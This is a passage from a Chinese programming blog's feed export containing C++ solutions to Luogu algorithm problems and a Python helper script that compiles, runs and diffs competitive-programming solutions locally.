alt="image-20240730195036047"></p><p>这里没能做出来，一直在调bug，这里直接复制题解上的<code>std::list</code>来解决。</p><p>这题其实还能用树来完成：<a href="https://www.luogu.com.cn/article/7fsccc6q">题解 P1160 【队列安排】 - 洛谷专栏 (luogu.com.cn)</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// #include &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// using namespace std;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// const int N = 1e5 + 5;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// int head, e[N], ne[N], idx;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// void init() &#123;</span></span><br><span class="line"><span class="comment">//   head = -1;</span></span><br><span class="line"><span class="comment">//   idx = 0;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// void add_to_head(int x) &#123;</span></span><br><span class="line"><span class="comment">//   e[idx] = x;</span></span><br><span class="line"><span class="comment">//   ne[idx] = head;</span></span><br><span class="line"><span class="comment">//   head = idx;</span></span><br><span class="line"><span class="comment">//   idx++;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// void insert(int x, int pos) &#123;</span></span><br><span class="line"><span class="comment">//     if(pos == 0)            //当pos为0时，直接插入到头部，insert只适用于非头节点插入</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         add_to_head(x);</span></span><br><span class="line"><span class="comment">//         return;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//   e[idx] = x;</span></span><br><span class="line"><span class="comment">//   ne[idx] = ne[pos];</span></span><br><span class="line"><span class="comment">//   ne[pos] = idx;</span></span><br><span class="line"><span class="comment">//   idx++;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// int find(int x)</span></span><br><span class="line"><span class="comment">// &#123;</span></span><br><span class="line"><span class="comment">//     int pos = 0;</span></span><br><span class="line"><span class="comment">//     for(int i = head; i != -1; i = ne[i])</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//         if(e[i] == x) return pos;</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//     return -1;</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// void remove(int pos) &#123; ne[pos] = ne[ne[pos]]; &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// int main() &#123;</span></span><br><span class="line"><span class="comment">//   int n, m;</span></span><br><span class="line"><span class="comment">//   int x, y;</span></span><br><span class="line"><span class="comment">//   cin &gt;&gt; n;</span></span><br><span class="line"><span class="comment">//   init();</span></span><br><span class="line"><span class="comment">//   int cnt = 1;</span></span><br><span class="line"><span class="comment">//   add_to_head(cnt++);</span></span><br><span class="line"><span class="comment">//     for(int i = 1; i &lt;  n; i ++)</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//     cin &gt;&gt; x &gt;&gt; y;</span></span><br><span class="line"><span class="comment">//     if (y == 1) &#123;</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">//       insert(cnt++, find(x));</span></span><br><span class="line"><span class="comment">//     &#125; else &#123;</span></span><br><span class="line"><span class="comment">//       insert(cnt++, find(x) -1);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"><span class="comment">//   &#125;</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="comment">//     cin &gt;&gt; m;</span></span><br><span class="line"><span class="comment">//     for(int i =  0; i &lt; m; i ++ )</span></span><br><span class="line"><span class="comment">//     &#123;</span></span><br><span class="line"><span class="comment">//         cin &gt;&gt; x;</span></span><br><span class="line"><span class="comment">//         if(find( x) - 1)</span></span><br><span class="line"><span class="comment">//         remove( find(x) - -1);</span></span><br><span class="line"><span class="comment">//     &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;list&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> Iter = list&lt;<span class="type">int</span>&gt;::iterator; <span class="comment">// 定义迭代器类型别名</span></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> maxN = <span class="number">1e5</span> + <span class="number">10</span>; </span><br><span class="line">Iter pos[maxN]; <span class="comment">// 记录每个同学在链表中的位置</span></span><br><span class="line">list&lt;<span class="type">int</span>&gt; queList; <span class="comment">// 双向链表</span></span><br><span class="line"><span class="type">bool</span> erased[maxN]; <span class="comment">// 记录同学是否被移除</span></span><br><span class="line"><span class="type">int</span> N; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">buildQueue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    queList.<span class="built_in">push_front</span>(<span class="number">1</span>); <span class="comment">// 将1号同学加入队列头</span></span><br><span class="line">    pos[<span class="number">1</span>] = queList.<span class="built_in">begin</span>(); <span class="comment">// 记录1号同学的位置</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= N; i++) &#123;</span><br><span class="line">        <span class="type">int</span> k, p;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;k, &amp;p); <span class="comment">// 输入插入指令</span></span><br><span class="line">        <span class="keyword">if</span> (p == <span class="number">0</span>) &#123;</span><br><span class="line">            pos[i] = queList.<span class="built_in">insert</span>(pos[k], i); <span class="comment">// 插入到k号同学左边</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">auto</span> nextIter = <span class="built_in">next</span>(pos[k]);</span><br><span class="line">            pos[i] = queList.<span class="built_in">insert</span>(nextIter, i); <span class="comment">// 插入到k号同学右边</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> M;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;M); <span class="comment">// 输入要移除的同学数量</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> x, i = <span class="number">1</span>; i &lt;= M; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;x); <span class="comment">// 输入要移除的同学编号</span></span><br><span class="line">        <span class="keyword">if</span> (!erased[x]) &#123;</span><br><span class="line">            queList.<span class="built_in">erase</span>(pos[x]); <span class="comment">// 移除指定同学</span></span><br><span class="line">        &#125;</span><br><span class="line">        erased[x] = <span class="literal">true</span>; <span class="comment">// 标记同学已被移除</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;N);</span><br><span class="line">  <span class="built_in">buildQueue</span>();</span><br><span class="line">  <span class="type">bool</span> first = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> x: queList)</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="keyword">if</span> (!first)</span><br><span class="line">          <span class="built_in">putchar</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">      first = <span class="literal">false</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, x);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="P1540-NOIP2010-提高组-机器翻译"><a href="#P1540-NOIP2010-提高组-机器翻译" class="headerlink" title="P1540 [NOIP2010 提高组] 机器翻译"></a>P1540 [NOIP2010 提高组] 机器翻译</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240801155046344.png" alt="image-20240801155046344"></p><p>使用队列来模拟内存，然后定义一个辅助数组记录哪些值被加载到内存上</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> <span class="type">long</span> LL;                            </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> a[<span class="number">1005</span>];</span><br><span class="line">queue&lt;<span class="type">int</span>&gt; que;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> m ,n;</span><br><span class="line">    cin &gt;&gt; m &gt;&gt; n;</span><br><span class="line">    <span class="type">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> tmp;</span><br><span class="line">        cin &gt;&gt; tmp;</span><br><span class="line">        <span class="keyword">if</span>(a[tmp])</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        a[tmp] = <span class="literal">true</span>;</span><br><span class="line">        cnt++;</span><br><span class="line">        que.<span class="built_in">push</span>(tmp);</span><br><span class="line">        <span class="keyword">if</span>(que.<span class="built_in">size</span>() &gt; m)</span><br><span class="line">            &#123;</span><br><span class="line">                a[que.<span class="built_in">front</span>()] = <span class="literal">false</span>;</span><br><span class="line">                que.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout &lt;&lt; cnt &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="P2058-NOIP2016-普及组-海港"><a href="#P2058-NOIP2016-普及组-海港" class="headerlink" title="P2058 [NOIP2016 普及组] 海港"></a>P2058 [NOIP2016 普及组] 海港</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240801171100179.png" alt="image-20240801171100179"></p><p>我们可以记录每个人而不是每艘船来解决问题</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> tm;</span><br><span class="line">    <span class="type">int</span> where;</span><br><span class="line">&#125;ship_man[<span class="number">300005</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> addr[<span class="number">100005</span>];</span><br><span class="line"><span class="type">int</span> uid;</span><br><span class="line"><span class="type">int</span> pre_uid;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(n--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> t, man, where;</span><br><span class="line">        cin &gt;&gt; t &gt;&gt; man;</span><br><span class="line">        <span class="keyword">while</span>(man--)</span><br><span class="line">        &#123;</span><br><span class="line">            cin &gt;&gt; where;</span><br><span class="line">            ship_man[uid].where = where;</span><br><span class="line">            ship_man[uid].tm = t;</span><br><span class="line">            <span class="keyword">if</span>(addr[where] == <span class="number">0</span>)    <span class="comment">//新物种</span></span><br><span class="line">                res++;</span><br><span class="line">            addr[where]++;</span><br><span class="line">            uid++;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">while</span>(ship_man[uid - <span class="number">1</span>].tm - ship_man[pre_uid].tm &gt;= <span class="number">86400</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            addr[ship_man[pre_uid].where]--;</span><br><span class="line">            <span class="keyword">if</span>(addr[ship_man[pre_uid].where] == <span class="number">0</span>)  <span class="comment">//物种灭绝</span></span><br><span class="line">                res--;</span><br><span class="line">            pre_uid++;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; res &lt;&lt; endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ACjudge0x1</title>
      <link href="/2024/07/25/python/ACjudge0x1/"/>
      <url>/2024/07/25/python/ACjudge0x1/</url>
      
        <content type="html"><![CDATA[<h1 id="ACjudge0x1"><a href="#ACjudge0x1" class="headerlink" title="ACjudge0x1"></a>ACjudge0x1</h1><p>在打算法题的时候，我通常使用<code>wsl2+vscode</code>的组合（感觉默认cpp提示太烂了，vs过于臃肿），当我们完成一道题目时，通常要使用<code>g++</code>编译，然后用<code>cv</code>大法查看是否ac。可是，在<code>debug</code>时，重复的动作过于痛苦，且难以区分输入输出。因此可以使用linux命令来解决这一问题。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ &#123;path&#125;  &amp;&amp; ./a.out &lt; input.txt &gt; output.txt &amp;&amp; diff output.txt answer.txt -y</span><br></pre></td></tr></table></figure><p>我们当然可以写入python脚本（其实shell脚本更简洁），并加上初始化功能（- i）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">files_to_create = [<span class="string">&quot;./input.txt&quot;</span>, <span class="string">&quot;./answer.txt&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_red</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\033[31m<span class="subst">&#123;text&#125;</span>\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_green</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\033[32m<span class="subst">&#123;text&#125;</span>\033[0m&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_yellow_bold</span>(<span class="params">text</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;\033[1;33m<span class="subst">&#123;text&#125;</span>\033[0m&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">judge</span>(<span class="params">path</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;File not found&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Compile the C++ program</span></span><br><span class="line">    command_compile = <span class="string">f&quot;g++ <span class="subst">&#123;path&#125;</span> -Wall&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result_compile = subprocess.run(command_compile, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">        <span class="built_in">print</span>(result_compile.stdout)</span><br><span class="line">        <span class="built_in">print</span>(result_compile.stderr)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Compilation failed with return code <span class="subst">&#123;e.returncode&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e.stderr)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Run the compiled program with input.txt and capture the output</span></span><br><span class="line">    command_run = <span class="string">&quot;./a.out &lt; input.txt &gt; output.txt&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        subprocess.run(command_run, shell=<span class="literal">True</span>, check=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Execution failed with return code <span class="subst">&#123;e.returncode&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e.stderr)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Compare the output with answer.txt</span></span><br><span class="line">    command_diff = <span class="string">&quot;diff output.txt answer.txt -y &quot;</span></span><br><span class="line">    print_yellow_bold(<span class="string">f&quot;judge file: <span class="subst">&#123;path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result_diff = subprocess.run(command_diff, shell=<span class="literal">True</span>, capture_output=<span class="literal">True</span>, text=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">if</span> result_diff.returncode == <span class="number">0</span>:</span><br><span class="line">            print_green(<span class="string">&quot;AC!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(result_diff.stdout)  <span class="comment"># This should print all differences</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print_red(<span class="string">&quot;You should check:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(result_diff.stdout)  <span class="comment"># This should print all differences</span></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Comparison failed with return code <span class="subst">&#123;e.returncode&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e.stderr[:<span class="number">500</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Initializing...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files_to_create:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(file):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">with</span> <span class="built_in">open</span>(file, <span class="string">&#x27;w&#x27;</span>):</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;file&#125;</span> created&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> FileExistsError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;File <span class="subst">&#123;file&#125;</span> exists&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    current_path = os.getcwd()</span><br><span class="line">    os.chdir(current_path)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">        path = sys.argv[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No file provided&quot;</span>)</span><br><span class="line">        exit(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> path <span class="keyword">in</span> (<span class="string">&quot;-I&quot;</span>, <span class="string">&quot;-i&quot;</span>, <span class="string">&quot;-init&quot;</span>):</span><br><span class="line">        init()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        judge(path)</span><br></pre></td></tr></table></figure><p>然后将python文件移动到系统脚本目录</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +x ACjudge                <span class="comment">//赋予可执行权限</span></span><br><span class="line">mv ./ACjudge /usr/local/bin/ACjudge</span><br></pre></td></tr></table></figure><p>当然，脚本还有许多可以添加的功能，如创建文件时自动添加模板……如果可以的话，还可以加个python爬虫（针对特定的平台，如洛谷，codeforce），当我们创建对应的文件时，自动爬取响应的输入输出。</p><p>vscode已经有许多插件实现这一效果，这里主要针对是平时练习时插件不太好使或者使用小众比赛的情况下。</p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> other </category>
          
      </categories>
      
      
        <tags>
            
            <tag> algorithm </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据结构</title>
      <link href="/2024/07/24/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2024/07/24/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h3 id="acwing826-单链表"><a href="#acwing826-单链表" class="headerlink" title="acwing826. 单链表"></a>acwing826. 单链表</h3><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240724153228930.png" alt="image-20240724153228930"></p><p>头插法：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 